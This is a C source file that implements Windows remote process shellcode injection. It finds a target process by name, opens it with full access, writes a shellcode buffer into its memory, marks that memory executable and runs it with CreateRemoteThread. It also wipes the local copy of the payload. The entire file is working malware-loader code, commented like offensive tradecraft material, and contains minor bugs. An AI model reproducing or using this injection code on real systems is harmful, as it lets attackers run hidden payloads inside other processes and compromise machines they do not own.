#include "injection.h"
#include <Tlhelp32.h>


// Gets the process handle of a process of name szProcessName
BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	HANDLE			hSnapShot		= NULL;
	PROCESSENTRY32	Proc			= {
					.dwSize = sizeof(PROCESSENTRY32) 
	};

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE){
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {

			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			// Converting each charachter in Proc.szExeFile to a lowercase character and saving it
			// in LowerName to do the wcscmp call later

			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// Compare the enumerated process path with what is passed
		if (wcscmp(LowerName, szProcessName) == 0) {
			// Save the process ID 
			*dwProcessId	= Proc.th32ProcessID;
			// Open a process handle and return
			*hProcess		= OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

	// Retrieves information about the next process recorded the snapshot.
	// while there is still a valid output ftom Process32Next, continue looping
	} while (Process32Next(hSnapShot, &Proc));
	


_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}


BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pShellcode, SIZE_T sPayloadSize) {
    PVOID	pShellcodeAddress			= NULL;
	SIZE_T	sNumberOfBytesWritten		= NULL;
    DWORD	dwProcessId				    = NULL;
	DWORD	dwOldProtection				= NULL;

    WDebugPrint(L"[i] Searching For Process Id Of \"%s\" ...\n", szProcessName);
	if (!GetRemoteProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
		printf("[!] Process is Not Found \n");
		return -1;
	}
	WDebugPrint(L"[+] DONE \n");
	DebugPrint("[i] Found Target Process Pid: %d \n", dwProcessId);

	// Allocating memory in "hProcess" process of size "sSizeOfShellcode" and memory permissions set to read and write
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		DebugPrint("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	DebugPrint("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

	// Writing the shellcode, pShellcode, to the allocated memory, pShellcodeAddress
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sPayloadSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sPayloadSize) {
		DebugPrint("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	DebugPrint("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

	// Cleaning the buffer of the shellcode in the local process
	memset(pShellcode, '\0', sPayloadSize);

	// Setting memory permossions at pShellcodeAddress to be executable 
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Running the shellcode as a new thread's entry in the remote process
	DebugPrint("[i] Executing Payload ... ");
	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		DebugPrint("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	DebugPrint("[+] DONE !\n");

	return TRUE;
}